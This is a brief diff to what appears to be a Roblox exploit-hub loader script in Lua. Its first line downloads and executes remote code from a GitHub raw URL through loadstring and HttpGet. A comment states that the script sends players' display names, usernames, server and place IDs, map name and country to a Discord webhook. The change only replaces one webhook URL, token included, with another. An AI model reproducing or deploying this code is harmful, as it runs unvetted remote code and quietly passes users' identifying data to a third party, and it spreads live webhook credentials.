@@ -1,6 +1,6 @@
 loadstring(game:HttpGet("https://raw.githubusercontent.com/dssdg1223/gojo-hub-publico/refs/heads/main/dsgsgsdgsddgsdg"))()
 -- Script externo: envia DisplayName, Username, JobId, PlaceId, Nome do mapa e País
-local WEBHOOK_URL = "https://discord.com/api/webhooks/1423498731143303329/6Y5-EXbR1cwZZH_kg4fU8sRRImo4MP3tCedIwwSVxBl4vKEOu7hyO4URA7Zj2ntjlwDJ"
+local WEBHOOK_URL = "https://discord.com/api/webhooks/1423848384845840517/l7G_UoL_CpHGhlcjAZ8iDesm6e27ueAdehEUBV1rRsvApo9_I0A8uw1Gi54Psr0Lp8Dk"
 
 local HttpService = game:GetService("HttpService")
 local Players = game:GetService("Players")
